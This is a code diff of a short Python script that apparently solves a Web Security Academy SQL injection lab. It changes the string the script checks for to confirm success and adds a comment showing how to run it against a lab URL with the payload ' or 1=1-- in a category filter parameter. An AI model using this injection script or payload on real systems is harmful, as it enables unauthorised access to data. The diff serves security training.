@@ -7,7 +7,7 @@ proxies = {'http': 'htpp://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 def exploit_sqli(url, payload):
     uri = '/filter?category='
     r = requests.get( url + uri + payload)
-    if "Cat Grin" in r.text:
+    if "Brain Power" in r.text:
         return True
     else:
         return False
@@ -26,3 +26,6 @@ if __name__ == "__main__":
         print("[+] SQL injection successful! ")
     else:
         print("[-] SQL injection unsuccessful!")
+
+#How to run the output
+#python3 sqli-lab-01.py https://0abf00df03ca158cc3e6dd14009a00fa.web-security-academy.net/ " ' or 1=1-- "
